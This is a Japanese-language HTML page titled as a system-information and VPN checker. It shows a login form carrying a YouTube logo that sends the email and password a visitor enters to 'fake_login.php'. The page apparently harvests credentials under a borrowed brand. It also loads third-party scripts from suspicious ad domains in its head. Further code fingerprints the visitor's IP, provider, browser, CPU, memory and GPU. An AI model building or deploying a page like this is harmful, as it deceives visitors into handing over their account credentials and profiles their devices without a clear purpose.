<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>システム情報とVPNチェック</title>
  <link rel="stylesheet" href="styles.css">

  <!-- 広告のスクリプト読み込み -->
  <script async src="//pl25082341.profitablecpmrate.com/aa/3e/93/aa3e9339a9b40453e2e60b8ab027c4d4.js"></script>
  <script async src="//pl25082392.profitablecpmrate.com/2230f4de6975fa6ecbeefbbc53411cf4/invoke.js"></script>
  <script async src="//gappoison.com/2230f4de6975fa6ecbeefbbc53411cf4/invoke.js"></script>
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <img class="youtube-logo" src="//github.com/ZeraitoX/website/blob/main/youtube-logo.png" alt="YouTube Logo">
      <h2>ログイン</h2>
      <form action="fake_login.php" method="POST">
        <div class="textbox">
          <input type="email" placeholder="メールアドレス" name="email" required>
        </div>
        <div class="textbox">
          <input type="password" placeholder="パスワード" name="password" required>
        </div>
        <button type="submit" class="btn">ログイン</button>
      </form>

      <!-- IPアドレスとVPN情報 -->
      <div class="output">
        <h3>あなたのIPアドレス</h3>
        <p>IPv4: <span id="ipv4">取得中...</span></p>
        <p>IPv6: <span id="ipv6">取得中...</span></p>
        <p>プロバイダー: <span id="provider">取得中...</span></p>
        <p>VPN使用: <span id="vpn-status">確認中...</span></p>
        <button onclick="getIPAddress()" class="btn">IPアドレスを取得</button>
      </div>

      <!-- システム情報 -->
      <div class="system-info">
        <h3>システム情報</h3>
        <p>ブラウザ: <span id="browser">取得中...</span></p>
        <p>OS: <span id="os">取得中...</span></p>
        <p>CPUコア数: <span id="cpu-cores">取得中...</span></p>
        <p>CPUモデル: <span id="cpu-model">取得中...</span></p>
        <p>メモリ容量: <span id="memory">取得中...</span></p>
        <p>GPU情報: <span id="gpu">取得中...</span></p>
        <button onclick="getSystemInfo()" class="btn">システム情報を取得</button>
      </div>
    </div>
  </div>

  <script>
    // 修正済み IP アドレス取得関数
    async function getIPAddress() {
      try {
        // IPv4 を取得
        const ipv4Response = await fetch("https://api.ipify.org?format=json");
        const ipv4Data = await ipv4Response.json();
        document.getElementById("ipv4").textContent = ipv4Data.ip || "取得失敗";

        // IPv6 を取得
        const ipv6Response = await fetch("https://api64.ipify.org?format=json");
        const ipv6Data = await ipv6Response.json();
        document.getElementById("ipv6").textContent = ipv6Data.ip || "未対応";

        // プロバイダー情報取得
        const providerResponse = await fetch("https://ipapi.co/json/");
        const providerData = await providerResponse.json();
        document.getElementById("provider").textContent = providerData.org || "取得失敗";

        // VPN使用確認
        const vpnStatus = providerData.security?.vpn;
        document.getElementById("vpn-status").textContent = vpnStatus ? "使用中" : "未使用";
      } catch (error) {
        console.error("IPアドレスの取得中にエラー:", error);
        document.getElementById("ipv4").textContent = "取得失敗";
        document.getElementById("ipv6").textContent = "取得失敗";
        document.getElementById("provider").textContent = "取得失敗";
        document.getElementById("vpn-status").textContent = "確認失敗";
      }
    }

    // システム情報を取得する関数
    async function getSystemInfo() {
      try {
        // ブラウザ情報を明確に取得
        const browserInfo = getBrowserInfo();
        document.getElementById("browser").textContent = browserInfo;

        // OS情報
        const osInfo = navigator.userAgentData?.platform || navigator.platform || "取得失敗";
        document.getElementById("os").textContent = osInfo;

        // CPUコア数
        document.getElementById("cpu-cores").textContent = navigator.hardwareConcurrency || "取得失敗";

        // CPUモデル
        const cpuModel = await detectCpuModel();
        document.getElementById("cpu-model").textContent = cpuModel || "詳細不明";

        // メモリ情報
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "取得失敗";
        document.getElementById("memory").textContent = memory;

        // GPU情報
        const gpuInfo = getGpuInfo();
        document.getElementById("gpu").textContent = gpuInfo || "取得失敗";
      } catch (error) {
        console.error("システム情報の取得中にエラー:", error);
        document.getElementById("os").textContent = "取得失敗";
        document.getElementById("cpu-cores").textContent = "取得失敗";
        document.getElementById("cpu-model").textContent = "取得失敗";
        document.getElementById("memory").textContent = "取得失敗";
        document.getElementById("gpu").textContent = "取得失敗";
      }
    }

    // ブラウザ情報を特定する関数
    function getBrowserInfo() {
      const ua = navigator.userAgent;

      if (ua.includes("Firefox")) {
        return "Mozilla Firefox";
      } else if (ua.includes("Edg/")) {
        return "Microsoft Edge";
      } else if (ua.includes("Chrome") && !ua.includes("Chromium")) {
        return "Google Chrome";
      } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
        return "Apple Safari";
      } else if (ua.includes("OPR") || ua.includes("Opera")) {
        return "Opera";
      } else if (ua.includes("Chromium")) {
        return "Chromium";
      } else {
        return "不明なブラウザ";
      }
    }

    // CPUモデルを検出する関数
    async function detectCpuModel() {
      try {
        // userAgent解析
        const userAgent = navigator.userAgent;
        const cpuMatch = userAgent.match(/(Intel|AMD|Apple|ARM|Snapdragon|M[1-9]|Ryzen|Xeon|Celeron|Pentium|Core i[3-9]|Threadripper|Epyc)/i);
        if (cpuMatch) {
          return cpuMatch[0];
        }

        // Web Workerを使った速度ベンチマーク
        if (window.Worker) {
          return new Promise((resolve) => {
            const worker = new Worker(URL.createObjectURL(new Blob([`
              onmessage = function() {
                let count = 0;
                while (count < 1e7) count++;
                postMessage(performance.now());
              };
            `], { type: 'text/javascript' })));

            const startTime = performance.now();
            worker.onmessage = (e) => {
              const elapsed = performance.now() - startTime;
              worker.terminate();
              resolve(elapsed < 50 ? "ハイエンドCPU" : elapsed < 150 ? "ミドルレンジCPU" : "ローエンドCPU");
            };
            worker.postMessage(null);
          });
        }
      } catch (error) {
        console.error("CPUモデルの検出中にエラー:", error);
        return null;
      }
    }

    // GPU情報を取得する関数
    function getGpuInfo() {
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        const debugInfo = gl?.getExtension("WEBGL_debug_renderer_info");
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "取得失敗";
      } catch (error) {
        console.error("GPU情報の取得中にエラー:", error);
        return null;
      }
    }
  </script>
</body>
</html>
